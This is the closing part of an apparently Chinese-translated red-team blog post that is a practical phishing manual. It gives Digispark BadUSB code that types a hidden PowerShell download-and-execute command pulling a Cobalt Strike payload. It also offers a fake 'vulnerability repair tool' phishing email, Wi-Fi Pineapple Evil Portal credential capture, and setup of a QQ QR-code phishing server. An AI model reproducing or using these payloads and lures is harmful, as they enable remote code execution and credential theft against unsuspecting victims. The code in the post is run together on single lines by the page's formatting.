16.5mhz) Upload program Upload the program you want to execute, enter the code you want to upload, and click the right arrow to upload (the one on the left is verification, uploading includes the steps of verification) When uploading, it will let you save the program in one place, save it in one place at will. Case 1: Pop-up NotepadIf you want to pop-up notepad, burn the following program: 123456789101112#include &quot;DigiKeyboard.h&quot;void setup() { DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); delay(500); DigiKeyboard.println(&quot;notepad&quot;); delay(500); DigiKeyboard.sendKeyStroke(KEY_ENTER);}void loop(){} Case 2: CS releaseWhere xxxx is the CobaltStrike HTTP release address 1234567891011121314#include &lt;DigiKeyboardFr.h&gt;void setup() { DigiKeyboard.delay(5000); DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); DigiKeyboard.delay(500); DigiKeyboard.sendKeyStroke(KEY_CAPSLOCK); DigiKeyboard.delay(500); DigiKeyboard.println(&quot;powershell.exe -nop -w hidden -c 'IEX ((new-object net.webclient).downloadstring('xxxx'))'&quot;); DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.sendKeyStroke(KEY_CAPSLOCK);}void loop(){} Insert Digispark to release it~ Mail phishing CS releaseEmail contentEmail content (this requires the user to write a paragraph): Recently, there has been a xx vulnerability. The company contacted the xx manufacturer to provide a xx vulnerability repair tool. Please be sure to open it for repairDownload the repair tool:xxxx And you can put a Trojan File into this phishing mail~ Wi-Fi Pineapple Wi-Fi Phishing information collectionStart pineapple pie, install 4 net cables and plug in power Start the pineapple pie Connect to the pineapple pie management WIFI Open the browser and visit the pineapple pie management address: 172.16.42.1:1471, You can access the administrative address of Wifi Pineapple Configure network bridging (networking pineapple pie)The purpose of this operation is to logically: Victim -&gt; Pineapple pie -&gt; Internet The network structure allows the victim to connect to the pineapple pie’s phishing wifi and still be able to access the Internet, but the victim does not know that there is a pineapple pie between him and the Internet (When you click scan to scan the wifi, you can click several times until you scan the available wifi) Phishing with the Evil Portal plugin Then the victim will search for your phishing wifi SSID in his WIFI, and a pop-up window will appear on the landing page Enter the password and you will be phished~ If you want to make changes to the phishing pageWhen you have bridged the pineapple pie to the network, the pineapple pie itself can connect to the external network Connect to the pineapple pie management address just created, use XSHELL or the command line ssh connection tool, use ssh to log in to the pineapple pie terminal. After successful login, the display looks like this. Use the command to enter the port-xxxx directory(The filepath of your phishing website) 1cd portals/xxxx/ You can see the relevant web files, just modify them~ How to check phishing passwordsLog in to the backend of pineapple pie and enter the portal/xxxx folderThe password is stored in the pwd.txt file QR code fishing information collectionLet the victim directly scan the QR code, you can pop up the pop-up window of the QQ Zone (just for demonstration, modify its front-end page to make it more simulation), the victim fills in the account password, you can receive the information filled in at the server level, resulting in information leakage Build your own QR code phishing server receiverVisit github for a detailed build tutorial:GitHub - Resek4/QQFishing: QQ钓鱼，社会工程 Set up this service on your own server (you need to install docker-compose in advance), and then execute the following commands in sequence: 123git clone https://github.com/Cl0udG0d/QQFishingcd QQFishingdocker-compose up -d After setting up, access the server http://IP:5000 to access its phishing address Generate QR codeBaidu casually search for a QR code generation online tool that can embed pictures, such as:免费在线二维码生成器 Generate the phishing URL as a QR code, and the victim can scan the QR code to achieve the purpose of opening the phishing page, such as(This QR code is just an example, users need to regenerate it themselves)","link":"/2022/07/15/Four%20Fishing%20Scenes%20Demo%20Manual/"}],"tags":[],"categories":[{"name":"HackStyle","slug":"HackStyle","link":"/categories/HackStyle/"},{"name":"TechLearning","slug":"TechLearning","link":"/categories/TechLearning/"},{"name":"Toolkit","slug":"Toolkit","link":"/categories/Toolkit/"},{"name":"Penetration","slug":"Penetration","link":"/categories/Penetration/"}]}